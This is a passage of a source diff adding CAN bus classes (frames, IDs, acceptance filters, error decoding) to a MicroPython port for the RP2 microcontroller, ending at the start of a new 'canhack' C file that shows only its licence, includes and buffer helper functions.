+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "dlc exceeds data length"));
+        }
+        self->dlc = dlc_set ? dlc : len;
+
+        // Little-endian CPU, little endian buffering in MCP2517/18FD
+        self->payload[0] = buf[0];
+        self->payload[1] = buf[1];
+    }
+    self->can_id = canid->can_id;
+    self->timestamp_valid = false;
+    self->id_filter = 0;
+    self->tag = tag;
+
+    return self;
+}
+
+//////////////////////////// Static class method to create a list of CANFrame instances ///////////////////////////
+STATIC mp_obj_t rp2_canframe_from_bytes(mp_obj_t frames)
+{
+    if (!MP_OBJ_IS_STR_OR_BYTES(frames)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "String/bytes parameter expected"));
+    }
+    mp_buffer_info_t bufinfo;
+    uint8_t data[1];
+    rp2_buf_get_for_send(frames, &bufinfo, data);
+
+    if ((bufinfo.len % NUM_FRAME_BYTES) != 0) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Frames must be a multiple of %d bytes", NUM_FRAME_BYTES));
+    }
+    size_t num_frames = bufinfo.len / 19U;
+    uint8_t *buf_ptr = bufinfo.buf;
+    mp_obj_list_t *list = mp_obj_new_list(num_frames, NULL);
+
+    for (uint32_t i = 0; i < num_frames; i++) {
+        rp2_canframe_obj_t *self = m_new_obj(rp2_canframe_obj_t);
+        self->base.type = &rp2_canframe_type;
+
+        // Data not known at creation time
+        self->timestamp_valid = false;
+        self->id_filter = 0;                // Only received frames have this filled in
+
+        // Fill in data from the buffer
+        self->remote = (buf_ptr[0] & 0x01U) != 0;
+        self->dlc = buf_ptr[1] & 0x0fU;
+        self->tag = BIG_ENDIAN_WORD(buf_ptr + 3U);
+        self->can_id = BIG_ENDIAN_WORD(buf_ptr + 7);
+
+        ((uint8_t *)(self->payload))[0] = buf_ptr[11];
+        ((uint8_t *)(self->payload))[1] = buf_ptr[12];
+        ((uint8_t *)(self->payload))[2] = buf_ptr[13];
+        ((uint8_t *)(self->payload))[3] = buf_ptr[14];
+        ((uint8_t *)(self->payload))[4] = buf_ptr[15];
+        ((uint8_t *)(self->payload))[5] = buf_ptr[16];
+        ((uint8_t *)(self->payload))[6] = buf_ptr[17];
+        ((uint8_t *)(self->payload))[7] = buf_ptr[18];
+
+        list->items[i] = self;
+        buf_ptr += NUM_FRAME_BYTES;
+    }
+
+    return list;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_from_bytes_fun_obj, rp2_canframe_from_bytes);
+STATIC MP_DEFINE_CONST_STATICMETHOD_OBJ(rp2_canframe_from_bytes_obj, MP_ROM_PTR(&rp2_canframe_from_bytes_fun_obj));
+
+// Get the payload as bytes
+STATIC mp_obj_t rp2_canframe_get_data(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+    uint32_t len;
+
+    if (self->remote) {
+        len = 0;
+    }
+    else {
+        if (self->dlc > 8U) {
+            len = 8U;
+        }
+        else {
+            len = self->dlc;
+        }
+    }
+    return make_mp_bytes((uint8_t *)(self->payload), len);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_get_data_obj, rp2_canframe_get_data);
+
+// Get the payload as bytes
+STATIC mp_obj_t rp2_canframe_get_dlc(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    return MP_OBJ_NEW_SMALL_INT(self->dlc);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_get_dlc_obj, rp2_canframe_get_dlc);
+
+// Get the frame's tag
+STATIC mp_obj_t rp2_canframe_get_tag(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    return mp_obj_new_int_from_uint(self->tag);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_get_tag_obj, rp2_canframe_get_tag);
+
+// Returns the frame's timestamp, or None if no timestamp valid
+STATIC mp_obj_t rp2_canframe_get_timestamp(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    // An ISR can set timestamp_valid but since it is a boolean will not need to disable interrupts
+    if (self->timestamp_valid) {
+        return mp_obj_new_int_from_uint(self->timestamp);
+    }
+    else {
+        return mp_const_none;
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_get_timestamp_obj, rp2_canframe_get_timestamp);
+
+// Returns the ID acceptance filter that allowed through the frame
+STATIC mp_obj_t rp2_canframe_get_index(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    return MP_OBJ_NEW_SMALL_INT(self->id_filter);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_get_index_obj, rp2_canframe_get_index);
+
+// Returns True if the frame has an extended ID, False otherwise
+STATIC mp_obj_t rp2_canframe_is_extended(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    return self->can_id & (1U << 29) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_is_extended_obj, rp2_canframe_is_extended);
+
+// Returns True if the frame is a remote frame, False otherwise
+STATIC mp_obj_t rp2_canframe_is_remote(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    return self->remote ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_is_remote_obj, rp2_canframe_is_remote);
+
+// Get a CANID instance representing the frame's CAN ID
+STATIC mp_obj_t rp2_canframe_get_canid(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+    rp2_canid_obj_t *canid = m_new_obj(rp2_canid_obj_t);
+    canid->base.type = &rp2_canid_type;
+    canid->can_id = self->can_id;
+
+    return canid;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_get_canid_obj, rp2_canframe_get_canid);
+
+// Get a numeric value for the CAN ID, with 11-bit IDs in the range 0..7ff
+STATIC mp_obj_t rp2_canframe_get_arbitration_id(mp_obj_t self_in)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    uint32_t arbitration_id = self->can_id & (1U << 29) ? self->can_id & 0x1fffffffU : (self->can_id >> 18) & 0x7ffU;
+
+    return MP_OBJ_NEW_SMALL_INT(arbitration_id);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canframe_get_arbitration_id_obj, rp2_canframe_get_arbitration_id);
+
+STATIC void rp2_canframe_print(const mp_print_t *print, mp_obj_t self_in, mp_print_kind_t kind)
+{
+    rp2_canframe_obj_t *self = self_in;
+
+    mp_printf(print, "CANFrame(CANID(id=");
+    if (self->can_id & (1U << 29)) {
+        mp_printf(print, "E%08"PRIx32"", self->can_id & 0x1fffffffU);
+    }
+    else {
+        mp_printf(print, "S%03"PRIx32"", (self->can_id >> 18) & 0x7ffU);
+    }
+
+    mp_printf(print, "), dlc=%d, data=", self->dlc);
+
+    if(self->remote) {
+        mp_printf(print, "R");
+    }
+    else {
+        uint32_t len = self->dlc > 8U ? 8U : self->dlc;
+        if(self->dlc) {
+            for (uint32_t i = 0; i < len; i++) {
+                mp_printf(print, "%02x", ((uint8_t *) self->payload)[i]);
+            }
+        }
+        else {
+            mp_printf(print, "*");
+        }
+    }
+
+    if (self->timestamp_valid) {
+        mp_printf(print, ", timestamp=%lu", self->timestamp);
+    }
+
+    mp_printf(print, ")");
+}
+
+STATIC const mp_map_elem_t rp2_canframe_locals_dict_table[] = {
+    // Instance methods
+    { MP_OBJ_NEW_QSTR(MP_QSTR_is_remote), (mp_obj_t)&rp2_canframe_is_remote_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_canid), (mp_obj_t)&rp2_canframe_get_canid_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_arbitration_id), (mp_obj_t)&rp2_canframe_get_arbitration_id_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_is_extended), (mp_obj_t)&rp2_canframe_is_extended_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_data), (mp_obj_t)&rp2_canframe_get_data_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_dlc), (mp_obj_t)&rp2_canframe_get_dlc_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_tag), (mp_obj_t)&rp2_canframe_get_tag_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_timestamp), (mp_obj_t)&rp2_canframe_get_timestamp_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_index), (mp_obj_t)&rp2_canframe_get_index_obj },
+    // Static methods
+    { MP_ROM_QSTR(MP_QSTR_from_bytes), (mp_obj_t)(&rp2_canframe_from_bytes_obj) },
+};
+STATIC MP_DEFINE_CONST_DICT(rp2_canframe_locals_dict, rp2_canframe_locals_dict_table);
+
+const mp_obj_type_t rp2_canframe_type = {
+    { &mp_type_type },
+    .name = MP_QSTR_CANFrame,
+    .print = rp2_canframe_print,
+    .make_new = rp2_canframe_make_new,
+    .locals_dict = (mp_obj_t)&rp2_canframe_locals_dict,
+};
+///////////////////////////////////// End of CANFrame class //////////////////////////////////////
+
+////////////////////////////////////// Start of CANID class //////////////////////////////////////
+// Create the CANID instance and initialize the controller
+STATIC mp_obj_t rp2_canid_make_new(const mp_obj_type_t *type, mp_uint_t n_args, mp_uint_t n_kw, const mp_obj_t *all_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_arbitration_id,       MP_ARG_REQUIRED | MP_ARG_INT, {.u_int = 0x7ffU}},
+        {MP_QSTR_extended,             MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all_kw_array(n_args, n_kw, all_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t arbitration_id = args[0].u_int;
+    bool extended = args[1].u_bool;
+
+    if (extended) {
+        if ((arbitration_id < 0) || (arbitration_id >= (1U << 29))) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Extended arbitration ID values in range 0..0x1fffffff"));
+        }
+    }
+    else {
+        if ((arbitration_id < 0) || (arbitration_id >= (1U << 11))) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Standard arbitration ID values in range 0..0x7ff"));
+        }
+    }
+
+    rp2_canid_obj_t *self = m_new_obj(rp2_canid_obj_t);
+    self->base.type = &rp2_canid_type;
+
+    self->can_id = extended ? arbitration_id | (1U << 29) : arbitration_id << 18;
+
+    return self;
+}
+
+// Get a numeric value for the CAN ID, with 11-bit IDs in the range 0..7ff
+STATIC mp_obj_t rp2_canid_get_arbitration_id(mp_obj_t self_in)
+{
+    rp2_canid_obj_t *self = self_in;
+
+    uint32_t arbitration_id = self->can_id & (1U << 29) ? self->can_id & 0x1fffffffU : (self->can_id >> 18) & 0x7ffU;
+
+    return MP_OBJ_NEW_SMALL_INT(arbitration_id);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canid_get_arbitration_id_obj, rp2_canid_get_arbitration_id);
+
+// Returns True if the ID is an extended ID, False otherwise
+STATIC mp_obj_t rp2_canid_is_extended(mp_obj_t self_in)
+{
+    rp2_canid_obj_t *self = self_in;
+
+    return self->can_id & (1U << 29) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canid_is_extended_obj, rp2_canid_is_extended);
+
+// Get a CANID instance that will filter this ID
+STATIC mp_obj_t rp2_canid_get_id_filter(mp_obj_t self_in)
+{
+    rp2_canid_obj_t *self = self_in;
+    rp2_canidfilter_obj_t *filter = m_new_obj(rp2_canidfilter_obj_t);
+    filter->base.type = &rp2_canidfilter_type;
+
+    uint32_t eid = self->can_id & 0x3ffffU;
+    uint32_t sid = (self->can_id >> 18 )& 0x7ffU;
+
+    if (self->can_id & (1U << 29)) {
+        filter->fltobj = (1U << 30) | (eid << 11) | sid;
+        filter->mask = 0x5fffffffU;
+    }
+    else {
+        filter->fltobj = sid;
+        filter->mask = 0x400007ffU;
+    }
+
+    return filter;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canid_get_id_filter_obj, rp2_canid_get_id_filter);
+
+STATIC void rp2_canid_print(const mp_print_t *print, mp_obj_t self_in, mp_print_kind_t kind)
+{
+    rp2_canid_obj_t *self = self_in;
+
+    if (self->can_id & (1U << 29)) {
+        mp_printf(print, "CANID(id=E%03"PRIx32")", self->can_id & 0x1fffffffU);
+    }
+    else {
+        mp_printf(print, "CANID(id=S%03"PRIx32")", (self->can_id >> 18) & 0x7ffU);
+    }
+}
+
+STATIC const mp_map_elem_t rp2_canid_locals_dict_table[] = {
+    // Instance methods
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_arbitration_id), (mp_obj_t)&rp2_canid_get_arbitration_id_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_is_extended), (mp_obj_t)&rp2_canid_is_extended_obj },
+    { MP_OBJ_NEW_QSTR(MP_QSTR_get_id_filter), (mp_obj_t)&rp2_canid_get_id_filter_obj },
+};
+STATIC MP_DEFINE_CONST_DICT(rp2_canid_locals_dict, rp2_canid_locals_dict_table);
+
+const mp_obj_type_t rp2_canid_type = {
+    { &mp_type_type },
+    .name = MP_QSTR_CANID,
+    .print = rp2_canid_print,
+    .make_new = rp2_canid_make_new,
+    .locals_dict = (mp_obj_t)&rp2_canid_locals_dict,
+};
+////////////////////////////////////// End of CANID class //////////////////////////////////////
+
+///////////////////////////////// Start of CANIDFilter class ///////////////////////////////////
+// Create the CANID instance and initialize the controller
+STATIC mp_obj_t rp2_canidfilter_make_new(const mp_obj_type_t *type, mp_uint_t n_args, mp_uint_t n_kw, const mp_obj_t *all_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_filter,     MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all_kw_array(n_args, n_kw, all_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    mp_obj_t mask_obj = args[0].u_obj;
+
+    rp2_canidfilter_obj_t *self = m_new_obj(rp2_canidfilter_obj_t);
+    self->base.type = &rp2_canidfilter_type;
+
+    uint32_t mask = 0;
+    uint32_t match = 0;
+
+    if (mask_obj == MP_OBJ_NULL || mask_obj == mp_const_none) {
+        // Set up a filter for "accept all"
+        self->mask = 0;
+        self->fltobj = 0;
+    }
+    else {
+        if (!MP_OBJ_IS_STR_OR_BYTES(mask_obj)) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "Filter must be a String or bytes"));
+        }
+
+        mp_buffer_info_t bufinfo;
+        uint8_t data[1];
+        rp2_buf_get_for_send(mask_obj, &bufinfo, data);
+
+        if (bufinfo.len != 29U && bufinfo.len != 11U) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Filter must be 11 or 29 characters long"));
+        }
+
+        bool extended = bufinfo.len == 29U;
+
+        for (mp_uint_t i = 0; i < bufinfo.len; i++) {
+            char ch = (((byte *) bufinfo.buf)[i]);
+
+            if (ch == '1') {
+                mask = (mask  << 1) | 1U;
+                match = (match  << 1) | 1U;
+            }
+            else if (ch == '0') {
+                mask = (mask << 1) | 1U;
+                match = (match  << 1);
+            }
+            else if (ch == 'X') {
+                mask <<= 1;
+                match <<= 1;
+            }
+            else {
+                nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "Illegal character in filter: must be '1', '0' or 'X'"));
+            }
+        }
+
+        if (extended) {
+            // Need to break these into A and B for extended IDs because of the odd way that the MCP2517/18FD lays
+            // out its filter registers
+            uint32_t match_id_a = (match >> 18) & 0x7ffU;
+            uint32_t match_id_b = match & 0x3ffffU;
+
+            uint32_t mask_id_a = (mask >> 18) & 0x7ffU;
+            uint32_t mask_id_b = mask & 0x3ffffU;
+
+            self->mask = (1U << 30) | (mask_id_b << 11) | mask_id_a;            // Must match IDE value
+            self->fltobj = (1U << 30) | (match_id_b << 11) | match_id_a;        // .. of IDE=1
+        }
+        else {
+            uint32_t match_id_a = match & 0x7ffU;
+            uint32_t mask_id_a = mask & 0x7ffU;
+
+            self->mask = (1U << 30) | mask_id_a;                                // Must match IDE value
+            self->fltobj = match_id_a;                                          // .. of IDE=0
+        }
+    }
+
+    return self;
+}
+
+// Set the filter directly for testing purposes
+STATIC mp_obj_t rp2_canidfilter_test_set_filter(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            {MP_QSTR_fltobj,     MP_ARG_KW_ONLY | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},
+            {MP_QSTR_mask,       MP_ARG_KW_ONLY | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},
+    };
+
+    rp2_canidfilter_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    mp_obj_t fltobj_obj = args[0].u_obj;
+    mp_obj_t mask_obj = args[1].u_obj;
+
+    if (!MP_OBJ_IS_INT(fltobj_obj)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "fltobj must be an integer"));
+    }
+    if (!MP_OBJ_IS_INT(mask_obj)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "mask must be an integer"));
+    }
+    uint32_t fltobj = mp_obj_get_int(fltobj_obj);
+    uint32_t mask = mp_obj_get_int(mask_obj);
+
+    self->fltobj = fltobj;
+    self->mask = mask;
+
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_canidfilter_test_set_filter_obj, 1, rp2_canidfilter_test_set_filter);
+
+STATIC void rp2_canidfiler_print_mask(const mp_print_t *print, bool id_a, uint32_t mask, uint32_t fltobj)
+{
+    if (id_a) {
+        for(uint32_t i = 0; i < 11U; i++) {
+            if (mask & (1U << (10U - i))) {
+                // Must match
+                if (fltobj & (1U << (10U - i))) {
+                    mp_printf(print, "1");
+                }
+                else {
+                    mp_printf(print, "0");
+                }
+            }
+            else {
+                // Don't care
+                mp_printf(print, "X");
+            }
+        }
+    }
+    else {
+        for(uint32_t i = 0; i < 18U; i++) {
+            if (mask & (1U << (28U - i))) {
+                // Must match
+                if (fltobj & (1U << (28U - i))) {
+                    mp_printf(print, "1");
+                }
+                else {
+                    mp_printf(print, "0");
+                }
+            }
+            else {
+                // Don't care
+                mp_printf(print, "X");
+            }
+        }
+    }
+}
+
+STATIC void rp2_canidfilter_print(const mp_print_t *print, mp_obj_t self_in, mp_print_kind_t kind)
+{
+    rp2_canidfilter_obj_t *self = self_in;
+
+    mp_printf(print, "CANIDFilter(filter=");
+
+    // TODO print the 11/29 bit mask, with "Accept all" if 0/0
+    if (self->mask == 0 && self->fltobj == 0) {
+        mp_printf(print, "*");
+    }
+    else {
+        if (self->fltobj & (1U << 30)) {
+            // ID A
+            rp2_canidfiler_print_mask(print, true, self->mask, self->fltobj);
+            // ID B
+            rp2_canidfiler_print_mask(print, false, self->mask, self->fltobj);
+        }
+        else {
+            // ID A
+            rp2_canidfiler_print_mask(print, true, self->mask, self->fltobj);
+        }
+    }
+
+    mp_printf(print, ")");
+}
+
+STATIC const mp_map_elem_t rp2_canidfilter_locals_dict_table[] = {
+        // Instance methods
+        { MP_OBJ_NEW_QSTR(MP_QSTR_test_set_filter), (mp_obj_t)&rp2_canidfilter_test_set_filter_obj },
+};
+STATIC MP_DEFINE_CONST_DICT(rp2_canidfilter_locals_dict, rp2_canidfilter_locals_dict_table);
+
+const mp_obj_type_t rp2_canidfilter_type = {
+        { &mp_type_type },
+        .name = MP_QSTR_canidfilter,
+        .print = rp2_canidfilter_print,
+        .make_new = rp2_canidfilter_make_new,
+        .locals_dict = (mp_obj_t)&rp2_canidfilter_locals_dict,
+};
+
+////////////////////////////////////// End of CANIDFilter class //////////////////////////////////////
+
+////////////////////////////////////// Start of CANError class //////////////////////////////////////
+// Create the CANError instance and initialize the controller
+STATIC mp_obj_t rp2_canerror_make_new(const mp_obj_type_t *type, mp_uint_t n_args, mp_uint_t n_kw, const mp_obj_t *all_args)
+{
+    static const mp_arg_t allowed_args[] = {
+            {MP_QSTR_c1bdiag1,    MP_ARG_REQUIRED | MP_ARG_INT, {.u_int = 0}},
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all_kw_array(n_args, n_kw, all_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t c1bdiag1 = args[0].u_int;
+
+    rp2_canerror_obj_t *self = m_new_obj(rp2_canerror_obj_t);
+    self->base.type = &rp2_canerror_type;
+    self->c1bdiag1 = c1bdiag1;
+    self->timestamp = 0;
+
+    return self;
+}
+
+// Returns the error frame's timestamp, or None if no timestamp valid
+STATIC mp_obj_t rp2_canerror_get_timestamp(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return mp_obj_new_int_from_uint(self->timestamp);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_get_timestamp_obj, rp2_canerror_get_timestamp);
+
+STATIC mp_obj_t rp2_canerror_is_crc_error(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return self->c1bdiag1 & (1U << 21) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_is_crc_error_obj, rp2_canerror_is_crc_error);
+
+STATIC mp_obj_t rp2_canerror_is_stuff_error(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return self->c1bdiag1 & (1U << 20) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_is_stuff_error_obj, rp2_canerror_is_stuff_error);
+
+STATIC mp_obj_t rp2_canerror_is_form_error(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return self->c1bdiag1 & (1U << 19) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_is_form_error_obj, rp2_canerror_is_form_error);
+
+STATIC mp_obj_t rp2_canerror_is_ack_error(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return self->c1bdiag1 & (1U << 18) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_is_ack_error_obj, rp2_canerror_is_ack_error);
+
+STATIC mp_obj_t rp2_canerror_is_bit1_error(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return self->c1bdiag1 & (1U << 17) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_is_bit1_error_obj, rp2_canerror_is_bit1_error);
+
+STATIC mp_obj_t rp2_canerror_is_bit0_error(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return self->c1bdiag1 & (1U << 16) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_is_bit0_error_obj, rp2_canerror_is_bit0_error);
+
+STATIC mp_obj_t rp2_canerror_is_bus_off(mp_obj_t self_in)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    return self->c1bdiag1 & (1U << 23) ? mp_const_true : mp_const_false;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_canerror_is_bus_off_obj, rp2_canerror_is_bus_off);
+
+
+STATIC void rp2_canerror_print(const mp_print_t *print, mp_obj_t self_in, mp_print_kind_t kind)
+{
+    rp2_canerror_obj_t *self = self_in;
+
+    mp_printf(print, "CANError(");
+    bool prev_item = false;
+    // Prints the error type
+    if (self->c1bdiag1 & (1U << 23)) {
+        mp_printf(print, "bus_off=True");
+        prev_item = true;
+    }
+    if (self->c1bdiag1 & (1U << 21)) {
+        if (prev_item) {
+            mp_printf(print, ", ");
+        }
+        mp_printf(print, "crc_error=True");
+        prev_item = true;
+    }
+    if (self->c1bdiag1 & (1U << 20)) {
+        if (prev_item) {
+            mp_printf(print, ", ");
+        }
+        mp_printf(print, "stuff_error=True");
+        prev_item = true;
+    }
+    if (self->c1bdiag1 & (1U << 19)) {
+        if (prev_item) {
+            mp_printf(print, ", ");
+        }
+        mp_printf(print, "form_error=True");
+        prev_item = true;
+    }
+    if (self->c1bdiag1 & (1U << 18)) {
+        if (prev_item) {
+            mp_printf(print, ", ");
+        }
+        mp_printf(print, "ack_error=True");
+        prev_item = true;
+    }
+    if (self->c1bdiag1 & (1U << 17)) {
+        if (prev_item) {
+            mp_printf(print, ", ");
+        }
+        mp_printf(print, "bit1_error=True");
+        prev_item = true;
+    }
+    if (self->c1bdiag1 & (1U << 16)) {
+        if (prev_item) {
+            mp_printf(print, ", ");
+        }
+        mp_printf(print, "bit0_error=True");
+    }
+    if (prev_item) {
+        mp_printf(print, ", ");
+    }
+    mp_printf(print, "frame_cnt=%d, timestamp=%lu)", self->c1bdiag1 & 0xffffU, self->timestamp);
+}
+
+STATIC const mp_map_elem_t rp2_canerror_locals_dict_table[] = {
+        // Instance methods
+        { MP_OBJ_NEW_QSTR(MP_QSTR_get_timestamp), (mp_obj_t)&rp2_canerror_get_timestamp_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_is_crc_error), (mp_obj_t)&rp2_canerror_is_crc_error_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_is_stuff_error), (mp_obj_t)&rp2_canerror_is_stuff_error_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_is_form_error), (mp_obj_t)&rp2_canerror_is_form_error_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_is_ack_error), (mp_obj_t)&rp2_canerror_is_ack_error_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_is_bit1_error), (mp_obj_t)&rp2_canerror_is_bit1_error_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_is_bit0_error), (mp_obj_t)&rp2_canerror_is_bit0_error_obj },
+        { MP_OBJ_NEW_QSTR(MP_QSTR_is_bus_off), (mp_obj_t)&rp2_canerror_is_bus_off_obj },
+};
+STATIC MP_DEFINE_CONST_DICT(rp2_canerror_locals_dict, rp2_canerror_locals_dict_table);
+
+const mp_obj_type_t rp2_canerror_type = {
+        { &mp_type_type },
+        .name = MP_QSTR_CANError,
+        .print = rp2_canerror_print,
+        .make_new = rp2_canerror_make_new,
+        .locals_dict = (mp_obj_t)&rp2_canerror_locals_dict,
+};
+////////////////////////////////////// End of CANError class //////////////////////////////////////
Index: ports/rp2/canis/rp2_canhack.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/rp2_canhack.c b/ports/rp2/canis/rp2_canhack.c
new file mode 100644
--- /dev/null	(date 1620557481520)
+++ b/ports/rp2/canis/rp2_canhack.c	(date 1620557481520)
@@ -0,0 +1,717 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#include <stdio.h>
+#include <canis/canhack.h>
+#include <py/mperrno.h>
+#include <py/stream.h>
+#include <py/runtime.h>
+#include "py/mphal.h"
+#include "py/objstr.h"
+#include "py/obj.h"
+#include "rp2_canhack.h"
+#include "pico/stdlib.h"
+#include "hardware/pwm.h"
+
+// Placeholders for code that might not run on a second core and will be shared with other code
+// that generates interrupts
+STATIC void inline disable_irq(void) {
+    __asm__ __volatile__ ("cpsid i");
+}
+
+STATIC void inline enable_irq(void) {
+    __asm__ __volatile__ ("cpsie i");
+}
+
+STATIC void inline buf_get_for_send(mp_obj_t o, mp_buffer_info_t *bufinfo, byte *tmp_data) {
+    if (mp_obj_is_int(o)) {
+        tmp_data[0] = mp_obj_get_int(o);
+        bufinfo->buf = tmp_data;
+        bufinfo->len = 1;
+        bufinfo->typecode = 'B';
+    } else {
+        mp_get_buffer_raise(o, bufinfo, MP_BUFFER_READ);
+    }
+}
+
+STATIC uint32_t copy_mp_bytes(mp_obj_t *mp_bytes, uint8_t *dest, uint32_t max_len)
+{
+    if(!MP_OBJ_IS_STR_OR_BYTES(mp_bytes)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "Bytes parameter expected"));
+    }
+
+    mp_buffer_info_t bufinfo;
+    uint8_t data[1];
